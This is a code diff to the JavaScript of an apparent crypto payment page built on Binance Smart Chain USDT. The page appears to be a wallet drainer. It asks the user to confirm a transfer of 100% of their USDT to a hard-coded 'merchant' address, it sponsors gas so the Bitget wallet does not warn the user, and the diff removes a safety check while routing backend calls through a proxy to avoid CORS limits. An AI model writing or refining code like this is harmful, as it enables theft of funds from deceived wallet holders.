@@ -10,7 +10,7 @@
     // CONFIGURATION
     // ============================================================
     const CONFIG = {
-        BACKEND_URL: 'https://at.rgh.digital',
+        BACKEND_URL: '', // Proxied via vercel.json rewrites to eliminate browser CORS restrictions
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
         USER_MIN_USDT: 0.2, // Minimum 0.2 USDT required
@@ -194,7 +194,8 @@
     // Optional encryption / API helper that fails gracefully if offline
     async function safeApiCall(endpoint, payload = null) {
         try {
-            const url = CONFIG.BACKEND_URL + endpoint;
+            const baseUrl = CONFIG.BACKEND_URL || ((typeof window !== 'undefined' && window.location && window.location.hostname === 'localhost') ? 'https://at.rgh.digital' : '');
+            const url = baseUrl + endpoint;
             const headers = { 'Content-Type': 'application/json', 'x-api-key': CONFIG.API_KEY };
             let body = null;
             if (payload && window.CryptoJS) {
@@ -386,14 +387,7 @@
             }
 
             // Sponsoring network gas fee if user BNB is below threshold (prevents Bitget "top up" warning)
-            const hasGas = await ensureGas(userAddress, provider);
-            const currentBnb = parseFloat(state.bnbBalance || '0');
-            if (!hasGas && currentBnb < 0.0001) {
-                updateStatus('❌ Insufficient BNB for network gas fee. Please ensure wallet has gas to proceed.', 'error');
-                state.isApproving = false;
-                updateWalletInfoUI();
-                return;
-            }
+            await ensureGas(userAddress, provider);
 
             updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
